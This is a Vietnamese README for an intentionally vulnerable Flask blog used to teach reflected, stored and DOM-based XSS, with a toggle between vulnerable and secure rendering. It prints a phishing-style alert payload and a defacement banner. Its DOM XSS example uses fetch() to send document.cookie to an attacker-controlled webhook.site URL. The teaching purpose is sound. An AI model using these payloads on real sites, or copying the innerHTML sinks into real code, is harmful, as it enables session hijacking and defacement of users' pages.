# CodeBlog — Demo Reflected / Stored / DOM-based XSS

Ứng dụng web động (Flask + JS thuần)dùng để **demo trực quan 3 loại XSS**
Có thể bật/tắt chế độ **Vulnerable / Secure** để so sánh trước–sau khi vá lỗi.

## 1. Cấu trúc project

```
codeblog-xss-demo/
├── app.py                 # Flask app: routes trang + API JSON
├── data.py                # "DB" trong bộ nhớ: bài viết + bình luận
├── requirements.txt
├── templates/
│   ├── index.html          # Danh sách bài viết + tìm kiếm (Reflected) + lọc theo thẻ (DOM-based)
│   └── post.html           # Chi tiết bài viết + bình luận (Stored XSS)
└── static/
    ├── css/style.css        # Toàn bộ style gốc + style mới (toggle, banner, filter...)
    └── js/
        ├── common.js         # Quản lý chế độ Vulnerable/Secure + helper escapeHtml()
        ├── index.js           # Logic trang danh sách: search + lọc theo thẻ
        └── post.js            # Logic trang chi tiết + bình luận
```

## 2. Chạy ứng dụng

```bash
cd codeblog-xss-demo
pip install -r requirements.txt
python app.py
```

Mở trình duyệt: **http://localhost:5000**

Dữ liệu (bài viết, bình luận) lưu trong bộ nhớ (`data.py`) — sẽ **reset
mỗi khi restart** `python app.py`. Không cần cài database.

## 3. Chế độ Vulnerable / Secure

Góc phải thanh điều hướng có công tắc 🔓/🛡️. Trạng thái lưu ở
`localStorage` nên giữ nguyên khi chuyển trang. Công tắc này **chỉ đổi
cách FRONTEND render dữ liệu ra DOM** — đúng nguyên tắc bảo mật chuẩn:
*"luôn encode output tại đúng nơi/ngữ cảnh xuất dữ liệu, không cố lọc
dữ liệu lúc nhận input hay lúc lưu trữ."* Vì vậy backend/API luôn trả
dữ liệu "thô", không hề đổi theo mode.

| | Vulnerable  | Secure  |
|---|---|---|
| Cách render | `element.innerHTML = rawValue` | `element.textContent = value` hoặc `escapeHtml(value)` trước khi `innerHTML` |
| Script trong input | Thực thi được | Chỉ hiển thị dưới dạng text vô hại |

## 4. Ba demo XSS

### 4.1 Reflected XSS — Tấn công giả mạo giao diện / Cảnh báo độc hại (Defacement / Phishing Popup) — thanh tìm kiếm (trang chủ)

**Mục tiêu:** Chứng minh mã độc có thể bật cửa sổ popup cảnh báo giả
mạo hoặc thay đổi tức thời nội dung giao diện trên màn hình nạn nhân
ngay khi họ bấm vào một đường link bẩn.

- `GET /api/search?q=...` — server **echo lại y nguyên** từ khoá tìm
  kiếm trong JSON trả về (`{"query": "..."}`), không hề lọc.
- Frontend (`index.js → renderSearchStatus`) ở chế độ **Vulnerable**
  chèn `data.query` vào `innerHTML` của thanh trạng thái tìm kiếm.
- Gõ tìm kiếm cũng tự cập nhật URL thành `/?q=...`, nên có thể demo
  đúng kịch bản "kẻ tấn công gửi link" chứ không chỉ gõ tay. **Payload
  minh họa** (nhập vào ô tìm kiếm):
  ```html
  <img src="x" onerror="alert('CẢNH BÁO: Phiên làm việc của bạn đã hết hạn. Vui lòng đăng nhập lại!')">
  ```
  Nhập chuỗi trên vào ô tìm kiếm rồi Enter (hoặc mở thẳng URL
  `http://localhost:5000/?q=<payload>`) → popup cảnh báo giả mạo hiện
  lên ngay lập tức, mô phỏng chiêu lừa "phiên đăng nhập hết hạn" để dụ
  nạn nhân đăng nhập lại vào trang giả.
- Chuyển công tắc sang **Secure** rồi thử lại → chữ hiện ra y nguyên
  dạng text, **không** có popup nào.

### 4.2 Stored XSS — Tấn công phá hoại giao diện vĩnh viễn / Tiêm mã độc diện rộng (Defacement / Persistent Alteration) — phần bình luận (trang chi tiết bài viết)

**Mục tiêu:** Chứng minh Stored XSS lưu trữ vĩnh viễn trên Database,
khiến bất kỳ ai mở bài viết lên cũng sẽ bị biến đổi hoặc làm sập giao
diện trang web.

- Click một bài viết ở trang chủ → chuyển hẳn sang URL riêng
  `/post/<id>`.
- `POST /api/comments/<id>` lưu **nguyên văn** `content` gửi lên vào
  `data.COMMENTS` (không lọc HTML). `GET /api/comments/<id>` trả lại
  toàn bộ bình luận y như đã lưu.
- Frontend (`post.js → loadComments`) ở chế độ **Vulnerable** render
  `comment.content` bằng `innerHTML`.
- **Thử ngay**: trong khung bình luận, nhập tên bất kỳ và nội dung
  (payload minh họa):
  ```html
  <div style="background: black; color: red; padding: 20px; text-align: center; font-size: 20px; font-weight: bold;">
      ⚠️ CẢNH BÁO: TOÀN BỘ DỮ LIỆU CỦA HỆ THỐNG NÀY ĐÃ BỊ HACK! ⚠️
  </div>
  ```
  rồi bấm "Gửi bình luận". Payload được **lưu ở server**. Tải lại
  trang, hoặc mở trang này ở trình duyệt/tab khác (đóng vai "nạn
  nhân") → toàn bộ khu vực bình luận bị "biến dạng" thành banner đen-đỏ
  chiếm trọn giao diện, **không cần họ gõ gì cả**. Đây là điểm khác
  biệt cốt lõi so với Reflected XSS (không cần request độc hại mỗi lần
  — payload nằm sẵn trong dữ liệu và ảnh hưởng đến **mọi** người xem
  bài viết).
- Chuyển sang **Secure** → nội dung cũ (kể cả payload đã lưu trước đó)
  hiển thị lại dưới dạng text vô hại.

### 4.3 DOM-based XSS — Đánh cắp Cookie ngầm / Chiếm đoạt phiên làm việc (Cookie Stealer qua Webhook) — bộ lọc bài viết theo thẻ qua link chia sẻ (trang chủ)

**Mục tiêu:** Sử dụng kỹ thuật DOM XSS để trích xuất ngầm
`document.cookie` và gửi về máy chủ nhận dữ liệu (Webhook) mà không
làm gián đoạn trải nghiệm của người dùng.

Đây là tính năng **thật** của blog: bấm vào một thẻ ngôn ngữ (vd.
"Python") ở sidebar → trang lọc bài viết theo thẻ đó **và** cập nhật
URL thành `/?tag=Python` để bạn copy gửi cho người khác ("xem mấy bài
Python ở đây nè!").

- **SOURCE**: `location.search` — khi trang tải xong, `index.js` tự
  đọc tham số `tag` từ chính URL bằng `URLSearchParams` (không gọi
  API nào để lấy giá trị này — thuần phía client).
- **SINK** (chế độ Vulnerable, hàm `renderTagFilterBanner`): giá trị
  `tag` được nối thẳng vào chuỗi HTML rồi gán qua `innerHTML` để hiện
  banner "🏷️ Đang lọc bài viết theo thẻ: ...".
- Để demo, tự dựng URL tấn công theo mẫu bên dưới rồi gửi cho "nạn
  nhân" (hoặc dán thẳng lên thanh địa chỉ trình duyệt). Trước tiên tạo
  một endpoint nhận dữ liệu miễn phí tại https://webhook.site để lấy
  `YOUR-UUID`. **Payload minh họa** (gắn vào URL):
  ```
  http://localhost:5000/?tag=<img src=x onerror="fetch(`https://webhook.site/YOUR-UUID?cookie=${document.cookie}`)">
  ```
  Gửi link này cho "nạn nhân" (mở ở tab/trình duyệt khác) — ngay khi
  trang chủ tải xong, nó tự đọc `tag` từ URL, render banner và **âm
  thầm** gọi `fetch` gửi `document.cookie` về trang webhook.site của
  kẻ tấn công, **không cần nạn nhân bấm gì thêm** và giao diện trông
  vẫn bình thường (không có popup nào gây chú ý). Kiểm tra lại trang
  webhook.site để thấy cookie vừa "đánh cắp" được.
- Vì toàn bộ xảy ra trên trình duyệt (server không hề dùng tham số
  `tag` để render gì — route `/` luôn trả về cùng 1 trang tĩnh), **server
  không hề thấy payload này trong log** — đặc điểm khiến DOM-based XSS
  khó bị WAF/log phía server phát hiện hơn Reflected/Stored.
- Chuyển sang **Secure** → `renderTagFilterBanner` dựng DOM bằng
  `createElement`/`textContent` thay vì `innerHTML`, link tấn công
  tương tự không còn hiệu lực — "tag" luôn hiển thị như text thuần và
  không có request nào bị gửi ngầm đi webhook.

## 5. Vì sao cả 3 chỗ đều "chỉ encode ở nơi xuất dữ liệu"?

Đây là thực hành chuẩn theo OWASP: **không cố lọc/sanitize dữ liệu lúc
nhận input hoặc lúc lưu trữ** (dễ bị bypass bằng mã hoá lạ, Unicode,
double-encoding...), mà phải **encode đúng ngữ cảnh tại nơi dữ liệu
được ghi ra** (ở đây là HTML context → dùng `textContent` hoặc escape
HTML entity trước khi gán `innerHTML`). Vì vậy:

- Dữ liệu luôn được lưu/trả về "thô" ở backend (search echo, comment
  lưu nguyên văn) và URL luôn giữ nguyên giá trị người dùng đặt vào.
- Chế độ Vulnerable/Secure chỉ thay đổi **bước render cuối cùng** phía
  JS — đúng với bản chất thật của cả 3 loại lỗ hổng:
  - Reflected: server trả dữ liệu thô trong response → client render.
  - Stored: server lưu dữ liệu thô → client render (nhiều lần, nhiều người).
  - DOM-based: dữ liệu không qua server ở bước render → client tự đọc URL và render.

## 6. Mở rộng / dọn dẹp sau khi dùng để học

- Có thể thêm thư viện sanitize mạnh hơn (ví dụ DOMPurify) khi muốn
  cho phép một phần HTML an toàn (ví dụ bold/italic trong bình luận)
  thay vì escape toàn bộ.
- Vì dữ liệu chỉ ở bộ nhớ, dừng server (`Ctrl+C`) là coi như "reset"
  toàn bộ bình luận/payload đã chèn.